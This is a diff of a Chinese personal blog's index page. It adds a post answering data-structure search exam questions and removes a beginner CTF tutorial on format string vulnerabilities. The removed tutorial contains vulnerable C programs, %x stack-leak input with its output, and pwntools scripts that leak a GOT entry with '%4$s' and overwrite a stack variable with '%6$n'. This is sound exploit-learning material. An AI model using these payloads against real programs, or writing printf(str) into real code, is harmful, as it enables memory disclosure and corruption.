@@ -252,6 +252,170 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/18/数据结构基础-查找/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/18/数据结构基础-查找/" itemprop="url">数据结构基础--查找</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-18T21:01:18+08:00">
+                2018-12-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>2-1已知一个长度为16的顺序表L，其元素按关键字有序排列。若采用二分查找法查找一个L中不存在的元素，则关键字的比较次数最多是</strong></p>
+<p>我们知道折半查找就相当于是建立了一个二叉树，然后去搜索相应的叶子，那么查询的次数最多就应该是树的</p>
+<p>高度，也就是log~2~n+1，答案就是5了</p>
+<p><strong>2-2用二分查找从100个有序整数中查找某数，最坏情况下需要比较的次数是</strong></p>
+<p>和上个题一样，其实就是log~2~n+1，注意这里的log~2~n要向下取整也就是6</p>
+<p><strong>2-3在有n（n&gt;1000）个元素的升序数组<code>A</code>中查找关键字x。查找算法的伪代码如下所示：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">k = 0</span><br><span class="line">while ( k&lt;n 且 A[k]&lt;x )  k = k+3;</span><br><span class="line">if ( k&lt;n 且 A[k]==x )  查找成功;</span><br><span class="line">else if ( k-1&lt;n 且 A[k-1]==x ) 查找成功;</span><br><span class="line">     else if ( k-2&lt;n 且 A[k-2]==x ) 查找成功;</span><br><span class="line">          else 查找失败;</span><br></pre></td></tr></table></figure>
+<p>看算法，就是个简单的顺序查找，只不过是3个一组罢了。想象你要找的元素是第二个，因为折半查找先找中间，而你顺序查找的话一下子就找到了。所以答案很明显应该是前几个元素。</p>
+<p><strong>2-4下列二叉树中，可能成为折半查找判定树（不含外部结点）的是：</strong></p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fyc4flh0lrj30fq0lkwib.jpg" alt=""></p>
+<p>折半查找二叉树要注意，他的中序遍历是一个有序序列（升序的），但是折半就有个问题了，你是向上取整呢，还是向下取整呢？一般我们都是向下取整的，但其实这两种情况都可以，不过两种情况的二叉树在当顶点数是偶数时就会出现左右分配不均匀的情况，就会存在差异。</p>
+<ul>
+<li>当向上取整时，左多右少</li>
+<li>当向下取整时，左少右多</li>
+</ul>
+<p>做这种题目关键就是看他们的取整策略是否相同，这里有个小技巧，高度对称的一定不是，比如b、c。而d呢？根结点左是4，右是5，也就是向下取整，在看左子树的根结点，左2右1，是向上取整，矛盾所以错误。</p>
+<p><strong>2-5若二叉搜索树是有N个结点的完全二叉树，则不正确的说法是：</strong></p>
+<p>查找效率之前说过了就是logN，最小值一定在叶结点上也是对的，但最大却不一定在叶结点上，还有可能是中间。</p>
+<p><strong>2-6若一棵二叉树的后序遍历序列是{ 1, 3, 2, 6, 5, 7, 4 }，中序遍历序列是{ 1, 2, 3, 4, 5, 6, 7 }，则下列哪句是错的</strong></p>
+<p>这个就不说了，还原出来树就很简单了，怎么还原？先看后序，后序的最后一个是根结点，再看中序，中序中以根结点为mid分成两部分，左是左子树，右是右子树，重复上面的过程即可</p>
+<p><strong>2-10对二叉搜索树进行什么遍历可以得到从小到大的排序序列？</strong></p>
+<p>这个之前说那个折半查找树的时候说过了，中序（因为左一定小于中，右一定大于中）。</p>
+<p>其余的题目都是类似的或者是重复的，就不再说了（其实是今天还要被逼更新二叉树，来不及写了），successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/16/数据结构基础-图（下）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1981,248 +2145,6 @@ p.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/pwn学习（4）初识格式化字符串漏洞/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/19/pwn学习（4）初识格式化字符串漏洞/" itemprop="url">pwn学习（4）初识格式化字符串漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T19:44:06+08:00">
-                2018-11-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="什么是格式化字符串？"><a href="#什么是格式化字符串？" class="headerlink" title="什么是格式化字符串？"></a>什么是格式化字符串？</h1><p>这个问题我相信学过c语言的都不陌生，我们在使用printf一类（比如：sprintf、fprintf等）的函数时经常会用到这个东西，他的样子很好识别，一般就是%后面跟着一些字符，比如下面我们printf函数的第一个参数</p>
-<pre><code>#include&lt;stdio.h&gt;
-int main()
-{
-    printf(&quot;this is a format string %s&quot; , &quot;yes&quot;);
-    return 0;
-}
-</code></pre><p>它主要是用一个说明符（在上面的例子中是s）来告诉程序该以何种格式来输出，而后为我们在输出中按格式填充入我们在后面的内容</p>
-<p>下面是几个常见的说明符</p>
-<pre><code>%d - 十进制 - 输出十进制整数
-%s - 字符串 - 从内存中读取字符串
-%x - 十六进制 - 输出十六进制数
-%c - 字符 - 输出字符
-%p - 指针 - 指针地址
-%n - 到目前为止所写的字符数
-</code></pre><p>这里前几个都是用来打印的，最后一个却是一个“异类”，这家伙的作用是写入到某个内存区域到现在为止写过的字符个数。注意要和%n$n区别开来，这个的作用是“选择”，举个例子讲，%3$s，这个的意思就是将第三个我们的填充物以%s的格式打印出来。<br>因为这些说明符的种种特性，我们可以使用它们来干一些“坏事”</p>
-<h1 id="漏洞在哪？"><a href="#漏洞在哪？" class="headerlink" title="漏洞在哪？"></a>漏洞在哪？</h1><p>如果我想让你写一段代码打印出我输入的字符串你会怎么办？我相信大多数人会写出下面的代码：</p>
-<pre><code>char str[100]
-scanf(&quot;%s&quot;,str)
-printf(&quot;%s&quot;,str)
-</code></pre><p>代码看上去很简单嘛，但总有人喜欢偷懒，他会写成如下的形式：</p>
-<pre><code>printf(str)
-</code></pre><p>这就出问题了，一般的函数，传入的参数都是固定的，但printf却不同，因为它要求有一个format string，这个format string就是它的身家性命，这东西就决定了它后面有多少的参数，而就算是你的format string后面没有足够的参数，他也会认为“你有足够的参数”，然后自动读取栈上的数据，按照你的format打印出来。那我们就可以玩点有趣的东西了，我们先给出个程序（程序代码来自ctf wiki）</p>
-<pre><code>#include &lt;stdio.h&gt;
-int main() {
-  char s[100];
-  int a = 1, b = 0x22222222, c = -1;
-  scanf(&quot;%s&quot;, s);
-  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
-  printf(s);
-  return 0;
-}
-</code></pre><p>可以看到这个程序就存在格式化字符串的漏洞。程序逻辑很简单，在我们输入s后，它先是“安全”的打印了s的内容，然后又直接打印了s，我们是这运行时输入这样一段数据</p>
-<pre><code>AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
-</code></pre><p>然后我们就非（li）常（suo）惊（ying）讶（dang）的发现程序给我们输出这些内容：</p>
-<pre><code>00000001.22222222.ffffffff.AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
-AAAAffff5160,c2,f7e036bb,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825
-</code></pre><p>很显然程序把原本不用该暴露给我们的东西都吐了出来，而输出的第四部分41414141大家也应该很清楚，就是我们的AAAA</p>
-<h1 id="泄漏任意内存地址"><a href="#泄漏任意内存地址" class="headerlink" title="泄漏任意内存地址"></a>泄漏任意内存地址</h1><p>通过前几次的学习我们知道了got表可是个好东西，当时我们想法设法的泄漏出got表内容进而拿到libc里面所有我们想要的东西。而通过这个漏洞我们可以非常轻松的实现got表的泄漏</p>
-<p>还是以上面的程序为例，程序中存在scanf函数，那我们就泄漏这个函数的got表地址。</p>
-<p>首先先看一下我们上面的测试，刚才的测试可不是仅仅为了演示漏洞，我们还可以看见程序给我们的的输出中41414141和我们的输入“AAAA”实际上是一样的，而41414141也就是第五个打印的部分，那也就是说，前面的我们实际上都不需要，我们借助上面调皮的%n就可以完美实现打印这个东西了。</p>
-<p>话不多说，上脚本</p>
-<pre><code>from pwn import *
-sh = process(&apos;./leakmemory&apos;)
-leakmemory = ELF(&apos;./leakmemory&apos;)
-__isoc99_scanf_got = leakmemory.got[&apos;__isoc99_scanf&apos;]
-print hex(__isoc99_scanf_got)
-payload = p32(__isoc99_scanf_got) + &apos;%4$s&apos;
-print payload
-gdb.attach(sh)
-sh.sendline(payload)
-sh.recvuntil(&apos;%4$s\n&apos;)
-print hex(u32(sh.recv()[4:8])) 
-sh.interactive()
-
-0x804a014
-\x14\xa0\x0%4$s
-[*] running in new terminal: /usr/bin/gdb -q  &quot;./leakmemory.dms&quot; 8086 -x &quot;/tmp/pwn2rdIM1.gdb&quot;
-[+] Waiting for debugger: Done
-0xf7de20c0
-[*] Switching to interactive mode
-</code></pre><p>成功拿到了scanf在got表中的地址</p>
-<h1 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h1><p>那有了泄漏任意地址的方式，那我们有没有利用这个来实现覆盖地址呢？其实是可以的，这里我们要用到关于%n的知识，其实上面说过了，但还是再列一遍</p>
-<p><strong>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</strong></p>
-<p>这里应该分两部分，但今天有点事耽搁了，所以就先简单的看看第一部分，栈上的内存覆盖吧，程序如下（依旧来自ctf wiki）</p>
-<pre><code>/* example/overflow/overflow.c */
-#include &lt;stdio.h&gt;
-int a = 123, b = 456;
-int main() {
-  int c = 789;
-  char s[100];
-  printf(&quot;%p\n&quot;, &amp;c);
-  scanf(&quot;%s&quot;, s);
-  printf(s);
-  if (c == 16) {
-    puts(&quot;modified c.&quot;);
-  } else if (a == 2) {
-    puts(&quot;modified a for a small number.&quot;);
-  } else if (b == 0x12345678) {
-    puts(&quot;modified b for a big number!&quot;);
-  }
-  return 0;
-}
-</code></pre><p>简单看看，程序会输出变量c的地址，然后有个格式化字符串的漏洞，本来if判断c是不成立的，那我们就利用这个漏洞来改变c的值来让它符合。</p>
-<p>首先还是用我们刚才的泄漏栈变量的方式（也就是上面的方法）确定偏移</p>
-<pre><code>0xfff5de4c
-AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
-AAAAfff5dde8,c2,f7e7a6bb,fff5de0e,fff5df0c,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78
-</code></pre><p>可以看到偏移是6，那我们就知道了payload最后应该是%6$n，我们的目标是让c变成16，我们一开始输入的是拿p32()处理过的c的地址，只有4位，还缺12位，我们就补个%012d，让程序随便打12个数据就好了，分析完毕，上脚本！</p>
-<pre><code>from pwn import *
-sh = process(&apos;./overwrite.dms&apos;)
-c_addr = int(sh.recvuntil(&apos;\n&apos;, drop=True), 16)
-print hex(c_addr)
-payload = p32(c_addr) + &apos;%012d&apos; + &apos;%6$n&apos;
-print payload
-#gdb.attach(sh)
-sh.sendline(payload)
-print sh.recv()
-sh.interactive()
-</code></pre><p>successful！</p>
-<p>那今天就先到这里了～明天估计会有格式化字符串的第二篇，以及栈溢出的更多的玩法，具体还是要看我的学习进度了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2273,7 +2195,7 @@ sh.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
